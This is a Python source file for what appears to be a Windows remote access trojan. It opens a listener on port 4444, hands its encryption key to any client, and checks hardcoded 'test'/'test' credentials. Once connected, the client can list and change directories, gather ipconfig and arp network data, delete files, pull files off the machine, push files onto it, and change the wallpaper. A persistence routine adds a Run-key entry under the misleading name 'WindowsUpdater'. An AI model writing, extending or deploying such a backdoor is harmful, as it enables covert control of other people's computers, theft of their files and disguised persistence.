import os
import sys
import time
import socket
import ctypes
import subprocess
import winreg
from cryptography.fernet import Fernet
import platform

# ------------------ Encryption ------------------

key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt(data: bytes) -> bytes:
    return cipher.encrypt(data)

def decrypt(data: bytes) -> bytes:
    return cipher.decrypt(data)

def to_chunks(data: bytes, chunk_size: int = 1024):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

# ------------------ Registry Persistence ------------------

def add_to_startup_registry():
    exe_path = sys.executable
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        ) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdater", 0, winreg.REG_SZ, exe_path)
    except Exception as e:
        print(f"[Registry Error] {e}")

def remove_from_registry():
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_ALL_ACCESS
        )
        winreg.DeleteValue(reg_key, "WindowsUpdater")
        winreg.CloseKey(reg_key)
        print("✅ Entry removed from startup.")
    except FileNotFoundError:
        print("⚠️ Entry not found.")
    except Exception as e:
        print(f"❌ Error: {e}")

# ------------------ Wallpaper Control ------------------

def change_wallpaper(image_path: str) -> bytes:
    if not os.path.exists(image_path):
        return encrypt(b"Image not found")
    
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
    return encrypt(b"Wallpaper changed")

def predict_operating_system():
    os_name=platform.system()
    return os_name

# ------------------ Client Handler ------------------

class ClientHandler:
    def __init__(self, connection: socket.socket):
        self.connection = connection

    def send(self, data: bytes):
        self.connection.sendall(data)

    def recv(self, size: int = 1024) -> bytes:
        return self.connection.recv(size)

    def authenticate(self, valid_user="test", valid_pass="test") -> bool:
        self.send(encrypt(b"Username: "))
        username = decrypt(self.recv()).decode().strip()
        self.send(encrypt(b"Password: "))
        password = decrypt(self.recv()).decode().strip()

        if username == valid_user and password == valid_pass:
            self.send(encrypt(b"Authentication successful"))
            return True
        else:
            self.send(encrypt(b"Authentication failed"))
            return False

    def send_data(self, data: bytes):
        encrypted = encrypt(data)
        chunks = to_chunks(encrypted)
        self.send(encrypt(str(len(chunks)).encode()))
        time.sleep(1)
        for chunk in chunks:
            self.send(chunk)


    def handle_commands(self,os_name):
        while True:
            try:
                cmd = decrypt(self.recv()).decode()
                print(f"[Received] {cmd}")
                if cmd == "close":
                    break

                elif cmd == "dir":
                    result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "path":
                    current = os.path.abspath(os.getcwd())
                    self.send_data(current.encode())

                elif cmd == "ipconfig":
                    result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd == "arp -a":
                    result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
                    self.send_data(result.encode())

                elif cmd.startswith("del "):
                    filename = cmd.split(" ", 1)[1]
                    try:
                        os.remove(os.path.join(os.getcwd(), filename))
                        self.send(encrypt(b"File deleted"))
                    except:
                        self.send(encrypt(b"Deletion failed"))

                elif cmd.startswith("cd "):
                    directory = cmd.split(" ", 1)[1]
                    try:
                        os.chdir(directory)
                        current = os.path.abspath(os.getcwd())
                        self.send(encrypt(b"1"))
                        time.sleep(0.5)
                        self.send(encrypt(f"Changed to {current}".encode()))
                    except:
                        self.send(encrypt(b"Directory change failed"))

                elif cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    try:
                        with open(filename, "rb") as f:
                            content = encrypt(f.read())
                        self.send_data(content)
                    except:
                        self.send(encrypt(b"Download failed"))

                elif cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1]
                    chunk_len = int(decrypt(self.recv()).decode())
                    data = b''.join([self.recv() for _ in range(chunk_len)])
                    with open(filename, "ab") as f:
                        f.write(decrypt(data))
                    self.send(encrypt(b"Upload done"))

                elif cmd.startswith("wall "):
                    filename = cmd.split(" ", 1)[1]
                    result = change_wallpaper(os.path.join(os.getcwd(), filename))
                    self.send(encrypt(b"1"))
                    self.send(result)

                else:
                    self.send(encrypt(b"Unknown command"))

            except Exception as e:
                print(f"[Error] {e}")
                break

# ------------------ Main Server ------------------

def start_server():
    operating_system = predict_operating_system()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 4444))
        sock.listen(1)
        print("[*] Waiting for connection...")
        conn, addr = sock.accept()
        print(f"[*] Connection from {addr}")
        conn.sendall(key)
        conn.sendall(operating_system.encode())

        client = ClientHandler(conn)
        if client.authenticate():
            # add_to_startup_registry()
            # remove_from_registry()
            client.handle_commands(operating_system)
        conn.close()

if __name__ == "__main__":
    start_server()